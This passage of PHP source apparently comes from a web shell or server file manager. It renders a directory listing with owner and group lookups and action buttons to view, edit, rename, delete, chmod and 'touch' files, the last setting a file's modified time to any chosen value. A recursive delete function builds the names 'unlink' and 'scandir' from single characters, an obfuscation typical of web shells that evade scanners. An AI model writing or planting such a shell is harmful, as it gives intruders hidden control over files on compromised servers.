    $vJs = str_replace(['\\', "'", "\n", "\r"], ['\\\\', "\\'", '', ''], $v);
    $mtime = file_exists($currentDirectory . '/' . $v) ? date('Y-m-d H:i', filemtime($currentDirectory . '/' . $v)) : '-';
    $icon = $isDir ? '<span class="f-ico f-dir"><svg viewBox="0 0 16 16"><path d="M1.5 2.5h4l1.2 1.5h7.8v8.5h-13z" fill="currentColor" opacity=".9"/></svg></span>' : '<span class="f-ico f-file"><svg viewBox="0 0 16 16"><path d="M3 1.5h7l3 3V14.5H3z M10 1.5v3.2h3.2" fill="none" stroke="currentColor" stroke-width="1.4"/></svg></span>';
    echo '<tr>'
        . '<td class="item-name">' . $icon . '<a href="'.$itemLink.'" title="'.$vEsc.'">'.$vEsc.'</a></td>'
        . '<td class="size">'.filesize($currentDirectory . '/' . $v).'</td>'
        . '<td class="date">'.(function_exists('posix_getpwuid') ? (($pw = posix_getpwuid(fileowner($u))) ? $pw['name'] : fileowner($u)) : fileowner($u)).':'.(function_exists('posix_getgrgid') ? (($gr = posix_getgrgid(filegroup($u))) ? $gr['name'] : filegroup($u)) : filegroup($u)).'</td>'
        . '<td class="mtime">'.$mtime.'</td>'
        . '<td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>'
        . '<td class="act-cell"><div class="act-group" role="group" aria-label="Actions for '.$vEsc.'">'
        . '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$vEsc.'"><button type="submit" class="act-btn act-view" title="View / Edit"><svg viewBox="0 0 16 16"><path d="M1.5 8S4 3.5 8 3.5 12 8 14.5 8 12 12.5 8 12.5 4 8 1.5 8Z" fill="none" stroke="currentColor" stroke-width="1.4"/><circle cx="8" cy="8" r="2" fill="currentColor"/></svg><span>View</span></button></form>'
        . '<button type="button" class="act-btn act-edit" title="Edit" onclick="openAction(\'edit\', \''.$vJs.'\')"><svg viewBox="0 0 16 16"><path d="M11.5 2.5l2 2L5 13H3v-2z" fill="none" stroke="currentColor" stroke-width="1.4"/></svg><span>Edit</span></button>'
        . '<button type="button" class="act-btn act-rename" title="Rename" onclick="openAction(\'rename\', \''.$vJs.'\')"><svg viewBox="0 0 16 16"><path d="M2 4.5h9M7.5 2.5l2 2-2 2M14 8v5.5H2" fill="none" stroke="currentColor" stroke-width="1.4"/></svg><span>Rename</span></button>'
        . '<button type="button" class="act-btn act-del" title="Delete" onclick="openAction(\'delete\', \''.$vJs.'\')"><svg viewBox="0 0 16 16"><path d="M2.5 4h11M6.5 2.5h3M4 4l.7 9.5h6.6L12 4M6.5 7v4M9.5 7v4" fill="none" stroke="currentColor" stroke-width="1.4"/></svg><span>Delete</span></button>'
        . '<button type="button" class="act-btn act-chmod" title="Chmod" onclick="openAction(\'chmod\', \''.$vJs.'\', \''.$permission.'\')"><svg viewBox="0 0 16 16"><rect x="3" y="7" width="10" height="6.5" rx="1.2" fill="none" stroke="currentColor" stroke-width="1.4"/><path d="M5.5 7V5a2.5 2.5 0 015 0v2" fill="none" stroke="currentColor" stroke-width="1.4"/></svg><span>Chmod</span></button>'
        . '<button type="button" class="act-btn act-touch" title="Touch" onclick="openAction(\'touch\', \''.$vJs.'\', \''.$mtime.'\')"><svg viewBox="0 0 16 16"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="1.4"/><path d="M8 4.5V8l2.5 1.5" fill="none" stroke="currentColor" stroke-width="1.4"/></svg><span>Touch</span></button>'
        . '</div></td>'
        . '</tr>';

}

echo '</tbody></table>';
echo '<div id="actionModal" class="df-panel-wrap" style="z-index:10001;">';
echo '<div class="df-panel" style="min-width:380px;max-width:440px;text-align:left;">';
echo '<button type="button" onclick="closeModal(\'actionModal\')" class="df-x">[X]</button>';
echo '<h3 class="df-title" id="actionTitle">ACTION</h3>';
echo '<div id="actionFileName" class="action-file"></div>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'" id="actionForm">';
echo '<input type="hidden" name="view_file" id="actViewFile" value="" disabled>';
echo '<input type="hidden" name="delete_file" id="actDeleteFile" value="" disabled>';
echo '<input type="hidden" name="old_name" id="actOldName" value="" disabled>';
echo '<input type="hidden" name="rename_item" id="actRenameFlag" value="1" disabled>';
echo '<div id="actFieldRename" style="display:none;"><label class="act-label">New name</label><input type="text" name="new_name" id="actNewName" class="df-input" placeholder="new_name.php"></div>';
echo '<div id="actFieldChmod" style="display:none;"><label class="act-label">Permission (octal)</label><input type="text" name="chmod_mode" id="actChmodMode" class="df-input" placeholder="644"><input type="hidden" name="chmod_file" id="actChmodFile" value="" disabled><div class="act-hint">Common: 644 file · 755 dir/script · 600 secret · 777 only debug.</div></div>';
echo '<div id="actFieldTouch" style="display:none;"><label class="act-label">Modified time (empty = now)</label><input type="text" name="touch_time" id="actTouchTime" class="df-input" placeholder="2024-01-15 10:30:00"><input type="hidden" name="touch_file" id="actTouchFile" value="" disabled><div class="act-hint">Format: YYYY-MM-DD HH:MM:SS. Leave empty for current time.</div></div>';
echo '<div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">';
echo '<button type="button" onclick="closeModal(\'actionModal\')" class="df-btn" style="background:#374151;border-color:#374151;">Cancel</button>';
echo '<button type="submit" id="actionSubmit" class="df-btn">Apply</button>';
echo '</div>';
echo '</form>';
echo '</div>';
echo '</div>';
function deleteDirectory($dir) {
   $unl = "u"."n"."l"."i"."n"."k";
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return $unl($dir);
    }
    $scd = "s"."c"."a"."n"."d"."i"."r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
<script src="js/scripts.js"></script>
</div>
</body>
</html>
